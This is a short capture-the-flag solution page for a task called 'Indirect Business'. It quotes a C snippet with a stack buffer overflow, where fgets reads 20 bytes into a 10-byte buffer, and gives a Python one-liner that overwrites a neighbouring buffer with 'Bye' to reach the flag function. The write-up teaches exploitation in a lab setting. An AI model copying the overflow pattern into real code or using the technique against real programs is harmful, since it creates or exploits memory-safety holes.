---
nav_order: 1
parent: 'Task: Indirect Business'
---

# Solution

Use the buffer overflow to overwrite a string on the stack.
This is going to be copied to a global variable that is checked before calling the `get_flag()` function.

The vulnerability is in the `main()` function:

```c
char local_buff[10];  // Uninitialized buffer
char message[10];     // Buffer for input

fgets(message, 20, stdin);  // Overflow: reads 20 bytes into 10-byte buffer
strcpy(buff, local_buff);   // Copies local_buff (corrupted by overflow) to global buff
```

The overflow in `message` overwrites `local_buff`, which is then copied to the global `buff` variable.
The `check_static_var()` function checks if `buff` equals "Bye".

Exploit:

```sh
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*10 + b"Bye")' | ./buff-ovf
```

Or using the exploit script:

```sh
./exploit.sh | ./buff-ovf
```
